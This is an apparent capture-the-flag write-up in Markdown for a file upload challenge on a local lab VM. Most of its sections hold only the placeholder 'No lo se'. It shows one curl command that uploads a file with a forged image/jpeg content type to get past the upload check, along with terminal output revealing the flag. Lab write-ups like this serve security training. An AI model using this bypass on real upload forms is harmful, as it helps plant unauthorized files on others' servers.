# File Upload

## Page
* Url: http://192.168.56.101/?page=upload

## Exploit found

* No lo se

## Weaknesses

* No lo se

## Exploitation

* No lo se

```
curl -X POST -F "Upload=upload" -F "uploaded=@./Resource/nani;type=image/jpeg" "http://192.168.56.101/?page=upload" | grep succes
```

```

Resource git:(main) ✗ curl -X POST -F "Upload=upload" -F "uploaded=@./nani;type=image/jpeg" "http://192.168.56.101/?page=upload" | grep succes
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3036    0  2745  100   291    548     58  0:00:05  0:00:05 --:--:--   571
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/nani succesfully uploaded.</pre>


```

## Solution

* No lo se

## Sources

* No lo se

## FLAG
[-- 🌱 --][2]

[2]: ./flag.txt